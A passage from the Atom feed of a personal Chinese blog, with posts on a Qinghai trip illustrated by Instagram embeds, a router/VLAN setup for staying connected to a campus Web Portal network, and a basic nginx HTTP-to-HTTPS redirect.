background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BaEl-J_lU71/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-10-10T15:01:15+00:00">Oct 10, 2017 at 8:01am PDT</time></p></div></blockquote> <script async defer src="//platform.instagram.com/en_US/embeds.js"></script><blockquote class="blockquote-center">**器材：魅族 Pro6 后期：Snapseed**  *4.03mm F/2.2 1/100 376* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:34.629629629629626% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BaEmAU3lYef/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-10-10T15:01:33+00:00">Oct 10, 2017 at 8:01am PDT</time></p></div></blockquote> <script async defer src="//platform.instagram.com/en_US/embeds.js"></script>]]></content>
    
    <summary type="html">
    
      So Tough
    
    </summary>
    
    
      <category term="Life" scheme="https://burgertown.tk/categories/Life/"/>
    
    
      <category term="Photo" scheme="https://burgertown.tk/tags/Photo/"/>
    
  </entry>
  
  <entry>
    <title>VLAN 与校园网（想法）</title>
    <link href="https://burgertown.tk/2017/10/01/VLAN-and-Esurf/"/>
    <id>https://burgertown.tk/2017/10/01/VLAN-and-Esurf/</id>
    <published>2017-10-01T06:53:27.000Z</published>
    <updated>2019-09-29T18:09:10.008Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>想发这文的原因是某天某位大佬突然来了句双路由可以更舒服用上校园网</p><p>发现自己完全没有想过如何改善先前每天插拔网线的糟糕体验</p><p>大概是个老司机了 听到双路由就知道是怎么做的了</p><p>当然多个路由还要考虑多个供电之类的麻烦事 <del>写到这突然又有了个新思路！</del></p><p>其余当然就是实践啦</p><p>由于手边没有可以划分 VLAN 的路由器</p><p>所以这篇文只给出一个思路和操作的大概步骤</p><h2 id="Web-Portal"><a href="#Web-Portal" class="headerlink" title="Web Portal"></a>Web Portal</h2><p>要理解这个思路 首先要有一定的网络知识</p><p>不讲限制 说说这个认证的机制</p><p><a href="http://h3cxbj502.blog.51cto.com/821994/388910">PPPOE、Web+Portal、802.1x 常见三种认证方式对比</a> 这篇文章大概描述了 Web Portal 的特性和技术原理</p><p>根据我个人的经验 海大的校园网 经过了 PPPOE 和 Web Portal 的迭代</p><p>当然 Web Portal 也经过了迭代 一开始还是可以使用”网页登陆” 这就是 Web Portal</p><p>后来电信魔改了 Web Portal 所以连上校园网的时候跳出的页面没有登陆的选项 XD</p><p>所以 Web Portal</p><ol><li>IP 的分配使用的是 DHCP 的分配 因为灵活</li><li>IP 分配与认证是分离的 理由同上</li><li>IP 与认证是绑定的</li></ol><p>其他的就不细说了 上面这一段只是说点 Web Portal 技术原理</p><h2 id="MAC-欺骗"><a href="#MAC-欺骗" class="headerlink" title="MAC 欺骗"></a>MAC 欺骗</h2><p>这个很多人都在用吧 麻烦的不是每天重新认证</p><p>而是每天插拔网线去切换路由器的工作模式从而才能认证的</p><p>所以 MAC 欺骗</p><ol><li>每天需要进行一次路由器工作模式的更改</li><li>每天插拔网线很麻烦</li><li>DHCP 服务器的原理导致此方法可用</li></ol><h2 id="双路由"><a href="#双路由" class="headerlink" title="双路由"></a>双路由</h2><p>示意：路由 1（关闭 DHCP, 外来线插 LAN 口）-路由 2（路由 1 的 LAN 口接到路由 2 的 WAN 口，WAN 口配置为 DHCP 客户端，MAC 地址复制为手机的 MAC 地址）</p><p>很简单 只是把路由 1 作交换机 路由 2 作路由器 即把 MAC 欺骗里面的路由”一机多用”改为”专机专用”</p><h2 id="VLAN-方式"><a href="#VLAN-方式" class="headerlink" title="VLAN 方式"></a>VLAN 方式</h2><p>听到双路由之后我就开始构思 我所想只用一条线一个路由</p><p>那么需要满足一下的条件</p><ol><li>外来线对应的口需要承担交换机+WAN 口的作用 实现：虚拟网卡</li><li>交换机需要与 WAN 口逻辑上分离 实现：VLAN</li></ol><p>自行尝试与问了别人之后 单口复用是存在的 但是我们这个网络是不符合的</p><p>他的例子是这样的 <strong>要看懂下面这段话的需要一定的网络知识</strong></p><pre><code>一个路由器 经过接口和 VLAN 设置DHCP 服务器可以在这里接口的网络根据协议里面进行 IP 分配同时 PPPOE 可以根据协议找到他的服务器并进行认证</code></pre><p>即各个协议会有不同的寻找服务端的方式 所以不会冲突</p><p>但是我们现在的网络都是使用 DHCP 服务器来获取 IP</p><p>所以不适用</p><p>那就换个思路 加多一条网线</p><ol><li>WAN 口为正常的 DHCP 客户端</li><li>LAN 口接一条线作为交换机用</li><li>LAN 口需要与 WAN 口逻辑上分离 实现：VLAN</li></ol><p>VLAN 划分如下：</p><ol><li>交换机关联 除了接了外来线的 LAN 口设置为关 其他都设置为不关联</li><li>交换机关联 除了接了外来线的 LAN 口设置为不关联 其他都设置为关</li></ol><p>在接口页面把 VLAN1 跟我们平时用的 Wifi1 桥接 就是平时我们用的网络了</p><p>但是这样我们是无法接入到 VLAN2 的网络的 于是我想到了多 SSID</p><p>直接在 Wifi2 里添加并设置 在接口页面把 VLAN 跟 Wifi2 桥接</p><p>这样就完成了设置</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>不用下床 不用插拔线 已经很舒服了</p><p>当然也可能有更简单的方法</p><p>对了上面我说到写这篇文突然想到的东西</p><p>叫 POE(Power over Ethernet) 当然 这只是解决供电问题的</p><p>再扔个链接 <a href="http://blog.csdn.net/lycb_gz/article/details/6693826">深入理解 VLAN 形成和工作原理</a></p><p>就这样吧</p>]]></content>
    
    <summary type="html">
    
      多用脑 多思考
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="Network" scheme="https://burgertown.tk/tags/Network/"/>
    
      <category term="VLAN" scheme="https://burgertown.tk/tags/VLAN/"/>
    
  </entry>
  
  <entry>
    <title>Http 强制重定向至 Https</title>
    <link href="https://burgertown.tk/2017/08/03/Http-to-Https/"/>
    <id>https://burgertown.tk/2017/08/03/Http-to-Https/</id>
    <published>2017-08-02T17:00:06.000Z</published>
    <updated>2019-09-29T17:54:13.806Z</updated>
    
    <content type="html"><![CDATA[<p>这里说说想法和操作</p><h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>看了 <a href="http://19920309.blog.51cto.com/8277196/1334449">Rewrite(URL 重写）和 Redirect(301 重定向）的区别</a> 之后</p><p>我决定用 301 重定向</p><p>是因为</p><ul><li><p>希望从用户的想法中删除<del>Http</del>的想法 只留下 Https 的概念</p></li><li><p>老子喜欢</p></li></ul><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>就是在已经配置好 Https 的 Nginx 上改一下配置</p><p>增加下面这一段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        listen [::]:80 default_server;</span><br><span class="line">        server_name example.com www.example.com;</span><br><span class="line">        <span class="built_in">return</span> 301 https://$server_name<span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来自 <a href="https://www.bjornjohansen.no/redirect-to-https-with-nginx">REDIRECT ALL HTTP REQUESTS TO HTTPS WITH NGINX</a></p><p>然后打开 <a href="http://burgertown.ga">http://burgertown.ga</a> 会自动跳转到 <a href="https://burgertown.ga">https://burgertown.ga</a></p><p><del>如果有一天变成了腾讯云的警告界面 请不要惊讶 再看一次原理 就会明白了</del></p>]]></content>
    
    <summary type="html">
    
      强制重定向至未来
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="Web" scheme="https://burgertown.tk/tags/Web/"/>
    
      <category term="Nginx" scheme="https://burgertown.tk/tags/Nginx/"/>
    
      <category term="Https" scheme="https://burgertown.tk/tags/Https/"/>
    
  </entry>
  
  <entry>
    <title>青海之旅</title>
    <link href="https://burgertown.tk/2017/07/20/Travel-To-Qinghai/"/>
    <id>https://burgertown.tk/2017/07/20/Travel-To-Qinghai/</id>
    <published>2017-07-19T16:49:37.000Z</published>
    <updated>2019-09-29T18:06:38.873Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2017-7-20"><a href="#2017-7-20" class="headerlink" title="2017-7-20"></a>2017-7-20</h2><p>8 点降落着地的飞机 只能现在来写下这个 Blog 了~</p><p>日后再写体验 今天只放图 希望大家能去关注我的 Ins XD</p><p>注：如未标明拍摄器材 均由佳能 80D 所拍摄 Snapseed 后期</p><p>本文引用的图片来自本人的 Instagram 请自行确认是否能访问到 Instagram（求关注</p><p>当然有些拍妹子的图 我也不好发是吧（逃</p><h2 id="2017-07-24"><a href="#2017-07-24" class="headerlink" title="2017-07-24"></a>2017-07-24</h2><p>最后还是觉得把妹子图放上去吧 只要不露全脸 XD</p><p>Plus: 把图片插到文章里面去<del>~</del></p><h2 id="2017-07-25"><a href="#2017-07-25" class="headerlink" title="2017-07-25"></a>2017-07-25</h2><p>忘了带电源适配器 又神 TM 没电了 回到家才能写完 QAQ</p><p>补全了照片和照片信息 换了篝火的图 Peace</p><h2 id="路线"><a href="#路线" class="headerlink" title="路线"></a>路线</h2><p>这次的路线是这样的：<br>西宁 -&gt;  茶卡盐湖 -&gt; 青海湖、二郎剑 -&gt; 卓尔山 -&gt; 门源 -&gt; 塔尔寺 -&gt; END</p><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><p>2 点半从家出发到指定地点等 3 点送我们到机场的车</p><p>6 点半的飞机从广州到西宁</p><p>因为西宁是青海的省会城市</p><p>所以各方面应该都是比青海的其他城市都要好的</p><p>而据我路途上的观察 西宁是这些路途中最现代化的一个地方了</p><p>而且酒店的环境相对来说最好 <del>除了床太软</del></p><p>据导游说 他们对这个城市的分区是按东南西北来分的</p><p>其中有两个区是新兴开发的 相对以前的就会比较大气而且现代化</p><p>这里面就有刚建好的西宁火车站 <del>起码我看着比我们佛山火车站霸气多了</del></p><p>好像西宁有 40%的穆斯林 占比是挺多的了</p><p>说到穆斯林 当然少不了清真寺</p><p>当天景点的安排就是清真寺</p><p>但是恰逢是星期五 是穆斯林集体做礼拜的日子</p><p>这时的清真寺不对外开放 自然而然我们也没能进去 XD</p><p>到了自由活动的时间 我们逛了下市中心</p><p>个人感觉西宁建筑风味不太浓厚 建筑风格比较单调</p><p>在有清真寺的地方 会有”附近楼房高度不得超过清真寺高度的说法”</p><p>所以清真寺附近的楼房基本都是清一色的低矮平房</p><p>而在比较现代化的中心区域 则是现代气息太浓厚 o(︶︿︶)o 唉</p><p>最后套用我妈的一句话来结束这段 在经过一大片新建的居民楼时 我妈说</p><p>“他们的房子没有阳台的 看不到阳台 看不到晾衣服 总感觉这些房子没人住”</p><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><p>这天的目的地是茶卡盐湖</p><p>但是从西宁出发 会经过青海湖</p><p>青海湖旁又有一堆种着油菜花的田（应该是兼职给游客有偿拍照的）</p><blockquote class="blockquote-center">青海湖旁的油菜花田  **器材：魅族 Pro6**  *4.03mm F/2.2 1/156 112* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:50.0% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BWjn7S-FEx_/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-15T06:09:13+00:00">Jul 14, 2017 at 11:09pm PDT</time></p></div></blockquote><script async defer src="//platform.instagram.com/en_US/embeds.js"></script><blockquote class="blockquote-center">青海湖旁油菜花田  *17.0mm F/5.6 1/1000 100* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:28.14814814814815% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BWnIeqBldOV/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-16T14:51:23+00:00">Jul 16, 2017 at 7:51am PDT</time></p></div></blockquote><script async defer src="//platform.instagram.com/en_US/embeds.js"></script><p>我们这车人 对这些场景毫无抵抗力</p><p>一只想叫导游下车拍照 但是导游是老司机了</p><p>各种言语安慰 各种承诺之后会带我们来的</p><p>然后就成功的带到了今天的目的地 茶卡盐湖</p><p>说真的 我在朋友圈里放了图（小火车回程排的） 有人说</p><p>“感觉就一堆盐而已”</p><p>我想说。 真的只是感觉而已</p><p>因为在实地 <del>连盐你都看不到</del> 只缘身在此山中</p><p>我们乘小火车进入的 真正的火车 真正的铁轨 终点站是湖心</p><p>一路两边的场景你都不会信那是盐的 因为跟买回来磨好的盐相差太多</p><p><del>是我见识短</del> 下面放一张坐小火车回门口时拍的</p><blockquote class="blockquote-center">茶卡盐湖  *10.0mm F/6.3 1/800 100* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:28.14814814814815% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BWpnnavFhJI/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-17T14:01:57+00:00">Jul 17, 2017 at 7:01am PDT</time></p></div></blockquote><script async defer src="//platform.instagram.com/en_US/embeds.js"></script><p>火车刚开始时两旁的湖里杂质我到现在都不知道是不是盐。..</p><p>火车开到中段会有盐雕 呈现出来的颜色稍微有点黄</p><p>到了湖心 穿上鞋套就可以下湖了</p><p>靠近岸边的盐我估计是被人踩得太多了 所以磨成粉了 踩起来很像沙子</p><p>越往里面走 盐的形态越来越接近块状 踩起来就像踩石头一样 痛</p><p>在旅游旺季来这里拍照是一个很难受的事</p><ol><li><p>那里的山比较远 湖比较大</p></li><li><p>旅游旺季人贼多 很难找到没有人又好看的背景</p></li><li><p>太阳很大</p></li></ol><p>综合起来是 1+1&gt;2 的效果：<br>湖面反射阳光导致测光容易爆炸 <del>其实我没试过在这里过曝</del> 后期空间太小</p><p>由于盐是白色的 天空中的云也是白色的 所以会出现下面的情况</p><blockquote class="blockquote-center">茶卡盐湖 2  *18.0mm F/5.6 1/1250 100* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:30.277777777777775% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BW6iH4kFKuH/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-24T03:41:02+00:00">Jul 23, 2017 at 8:41pm PDT</time></p></div></blockquote> <script async defer src="//platform.instagram.com/en_US/embeds.js"></script><blockquote class="blockquote-center">在茶卡盐湖拍的小姐姐  *85.0mm F/5.6 1/640 100* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:33.33333333333333% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BW6lVj8lfrZ/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-24T04:09:07+00:00">Jul 23, 2017 at 9:09pm PDT</time></p></div></blockquote> <script async defer src="//platform.instagram.com/en_US/embeds.js"></script><p>人多难构图而且人的活动会扰乱水 导致很难拍出<strong>天空之镜</strong>的效果</p><p><strong>天空之镜</strong>还很需要阳光的配合</p><p>湖大 山远会是照片背景比较空</p><p>总之 我觉得想在这个地方旅游样的拍些好片比较难</p><p>本章结束 放一张我拍别人的图片 演示一下<strong>天空之镜</strong></p><blockquote class="blockquote-center">天空之镜的大概效果  *88.0mm F/5.6 1/1000 100* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:28.14814814814815% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BW8EZn7FoQR/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-24T17:59:48+00:00">Jul 24, 2017 at 10:59am PDT</time></p></div></blockquote><script async defer src="//platform.instagram.com/en_US/embeds.js"></script><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><p>青海湖听导游说是一个由于板块挤压所形成的湖 二郎剑是青海湖的一部分</p><p>青海湖这边就比较多人 不好构图 而且水质还不好 请看下图</p><blockquote class="blockquote-center">从青海湖这边看  *12.0mm F/5.0 1/2500 100* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:28.10185185185185% 0; text-align:center; width:100%;"> <div style=" 